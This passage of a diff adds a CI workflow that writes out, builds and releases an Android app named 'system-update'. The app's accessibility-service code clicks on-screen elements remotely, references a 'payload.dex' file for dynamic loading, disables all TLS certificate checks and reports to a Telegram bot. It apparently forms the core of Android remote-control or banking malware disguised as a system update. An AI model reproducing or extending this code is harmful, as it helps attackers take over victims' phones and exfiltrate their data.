+                      return "invalid_coords";
+                  } catch (Exception e) {
+                      return "error:" + e.getMessage();
+                  }
+              }
+
+              private String clickText(String text) {
+                  try {
+                      AccessibilityNodeInfo root = getRootInActiveWindow();
+                      if (root != null) {
+                          clickNodeWithText(root, text);
+                          return "clicked_text";
+                      }
+                      return "text_not_found";
+                  } catch (Exception e) {
+                      return "error:" + e.getMessage();
+                  }
+              }
+
+              private void clickNodeWithText(AccessibilityNodeInfo node, String text) {
+                  if (node == null) return;
+                  if (node.getText() != null && node.getText().toString().contains(text)) {
+                      node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                      return;
+                  }
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      clickNodeWithText(node.getChild(i), text);
+                  }
+              }
+
+              private String typeText(String text) {
+                  Log.d(TAG, "📝 Type: " + text);
+                  return "typed";
+              }
+
+              private String getDeviceInfo() {
+                  return android.os.Build.DEVICE + "|" + android.os.Build.VERSION.SDK_INT;
+              }
+
+              private String waitForDelay(long ms) {
+                  try {
+                      Thread.sleep(ms);
+                      return "waited_" + ms + "ms";
+                  } catch (InterruptedException e) {
+                      return "wait_interrupted";
+                  }
+              }
+
+              private String getDexPath() {
+                  return getCacheDir().getAbsolutePath() + "/payload.dex";
+              }
+
+              private void disableSSLVerification() {
+                  try {
+                      TrustManager[] trustAllCerts = new TrustManager[]{
+                          new X509TrustManager() {
+                              public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
+                              public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                              public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                          }
+                      };
+                      SSLContext sc = SSLContext.getInstance("TLS");
+                      sc.init(null, trustAllCerts, new java.security.SecureRandom());
+                      HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+                      HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
+                  } catch (Exception e) {
+                      Log.e(TAG, "SSL error: " + e.getMessage());
+                  }
+              }
+
+              private void sendTelegram(String message) {
+                  executor.execute(() -> {
+                      try {
+                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
+                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                          conn.setRequestMethod("POST");
+                          conn.setRequestProperty("Content-Type", "application/json");
+                          conn.setDoOutput(true);
+                          conn.setConnectTimeout(5000);
+                          conn.setReadTimeout(5000);
+                          
+                          String escaped = message.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n");
+                          String jsonPayload = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + escaped + "\",\"parse_mode\":\"Markdown\"}";
+                          
+                          byte[] payload = jsonPayload.getBytes("UTF-8");
+                          conn.setFixedLengthStreamingMode(payload.length);
+                          java.io.OutputStream os = conn.getOutputStream();
+                          os.write(payload);
+                          os.flush();
+                          os.close();
+                          
+                          int responseCode = conn.getResponseCode();
+                          if (responseCode == 200) {
+                              Log.d(TAG, "✅ Telegram sent");
+                          } else {
+                              Log.e(TAG, "Telegram failed: " + responseCode);
+                          }
+                          conn.disconnect();
+                      } catch (Exception e) {
+                          Log.e(TAG, "Telegram error: " + e.getMessage());
+                      }
+                  });
+              }
+
+              private String getCurrentTimestamp() {
+                  SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
+                  return sdf.format(new Date());
+              }
+
+              @Override
+              public void onAccessibilityEvent(AccessibilityEvent event) {}
+
+              @Override
+              public void onInterrupt() {
+                  Log.d(TAG, "⚠️ Service interrupted");
+              }
+
+              @Override
+              public void onDestroy() {
+                  super.onDestroy();
+                  executor.shutdown();
+                  if (isOverlayShowing) {
+                      hideOverlay();
+                  }
+              }
+          }
+          EOF
+
+      # ==================== BUILD APK ====================
+      
+      - name: Build APK
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleDebug
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: system-update-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
+
+      - name: Release APK
+        uses: ncipollo/release-action@v1
+        with:
+          artifacts: app/build/outputs/apk/debug/app-debug.apk
+          tag: dex-worker-v4.0
+          commit: main
